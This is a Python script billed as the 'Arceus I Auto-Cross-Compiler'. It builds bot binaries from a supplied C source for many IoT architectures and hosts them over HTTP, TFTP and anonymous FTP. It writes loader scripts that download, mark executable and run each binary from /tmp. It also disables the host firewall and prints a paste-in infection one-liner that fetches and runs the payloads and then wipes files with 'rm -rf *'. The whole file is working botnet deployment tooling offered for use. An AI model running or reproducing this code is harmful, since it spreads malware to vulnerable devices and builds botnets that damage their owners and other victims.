import subprocess, sys

if len(sys.argv[2]) != 0:
    ip = sys.argv[2]
else:
    print("\x1b[0;31mIncorrect Usage!")
    print("\x1b[0;32mUsage: python " + sys.argv[0] + " <BOTNAME.C> <IPADDR> \x1b[0m")
    exit(1)

bot = sys.argv[1]
print("\x1b[38;5;202mArceus I \x1b[38;5;201m- \x1b[38;5;202mAuto\x1b[38;5;201m-\x1b[38;5;202mCross\x1b[38;5;201m-\x1b[38;5;202mCompiler")
print("\x1b[38;5;202mBins \x1b[38;5;201m= \x1b[38;5;202mAreus\x1b[38;5;93m.\x1b[38;5;201m{\x1b[38;5;202mname\x1b[38;5;201m}")
print("\x1b[38;5;202mServer IP\x1b[38;5;201m: \x1b[38;5;201m[\x1b[38;5;202m"+ ip +"\x1b[38;5;201m]")
print("\x1b[38;5;202mDependency Installation\x1b[38;5;201m: \x1b[38;5;202mNo")
print("\x1b[38;5;202mCross\x1b[38;5;201m-\x1b[38;5;202mCompiler Installation\x1b[38;5;201m:\x1b[38;5;202m Yes")
yourafag = raw_input("\x1b[38;5;202mGet arch's? y/n:\x1b[38;5;93m")
if yourafag.lower() == "y":
    get_arch = True
else:
    get_arch = False
	
botnames = [
	"Arceus.mips", #mips
    "Arceus.mipsel", #mipsel
    "Arceus.sh4", #sh4
    "Arceus.x86", #x86
    "Arceus.armv6", #Armv6l
    "Arceus.i686", #i686
    "Arceus.powerpc", #ppc
    "Arceus.i586", #i586
    "Arceus.m86k", #m68k
    "Arceus.sparc", #sparc
    "Arceus.armv4", #armv4l
	"Arceus.armv5", #armv5l
	"Arceus.powerpc440" #ppc440fp
			]

getarch = [
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc-440fp.tar.bz2'
		]

ccs = [
	"cross-compiler-mips",
	"cross-compiler-mipsel",
	"cross-compiler-sh4",
	"cross-compiler-x86_64",
	"cross-compiler-armv6l",
	"cross-compiler-i686",
    "cross-compiler-powerpc",
    "cross-compiler-i586",
    "cross-compiler-m68k",
    "cross-compiler-sparc",
    "cross-compiler-armv4l",
    "cross-compiler-armv5l",
    "cross-compiler-powerpc-440fp"
	]

def run(cmd):
    subprocess.call(cmd, shell=True)

run("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")

if get_arch == True:
    run("rm -rf cross-compiler-*")

    print("Downloading Architectures")

    for arch in getarch:
        run("wget " + arch + " --no-check-certificate >> /dev/null")
        run("tar -xvf *tar.bz2")
        run("rm -rf *tar.bz2")

    print("Cross Compilers Downloaded...")

num = 0
for cc in ccs:
    arch = cc.split("-")[2]
    run("./"+cc+"/bin/"+arch+"-gcc -static -pthread -D" + arch.upper() + " -o " + botnames[num] + " " + bot + " > /dev/null")
    num += 1

print("Cross Compiling Done!")
print("Setting up your httpd and tftp")

run("yum install httpd -y")
run("service httpd start")
run("yum install xinetd tftp tftp-server -y")
run("yum install vsftpd -y")
run("service vsftpd start")

run('''echo -e "# default: off
# description: The tftp server serves files using the trivial file transfer \
#       protocol.  The tftp protocol is often used to boot diskless \
#       workstations, download configuration files to network-aware printers, \
#       and to start the installation process for some operating systems.
service tftp
{
        socket_type             = dgram
        protocol                = udp
        wait                    = yes
        user                    = root
        server                  = /usr/sbin/in.tftpd
        server_args             = -s -c /var/lib/tftpboot
        disable                 = no
        per_source              = 11
        cps                     = 100 2
        flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')
run("service xinetd start")

run('''echo -e "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart")

for i in botnames:
    run("cp " + i + " /var/www/html")
    run("cp " + i + " /var/ftp")
    run("mv " + i + " /var/lib/tftpboot")

run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp1.sh')
run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp1.sh')
run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1.sh')

run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp2.sh')
run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh')
run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh')

run('echo -e "#!/bin/bash" > /var/www/html/Arceus.sh')

for i in botnames:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/Arceus.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')

print('Stoping Iptables')
run("service iptables stop")
run("chkconfig iptables off")
print('Restarting Xinetd')
run("service xinetd restart")
print('Restarting Httpd')
run("service httpd restart")

print('Changing The Ulimit')
run('ulimit -Hn 999999; ulimit -Sn 99999')
run('ulimit -u 999999;ulimit -n 999999')
run('sysctl -w fs.file-max=999999 >/dev/null')
run('echo -e "ulimit -u 999999">> ~/.bashrc')
run('echo -e "ulimit -n 99999" >> ~/.bashrc')

print("\x1b[38;5;93mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/Arceus.sh; chmod 777 Arceus.sh; sh Arceus.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Arceus.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *")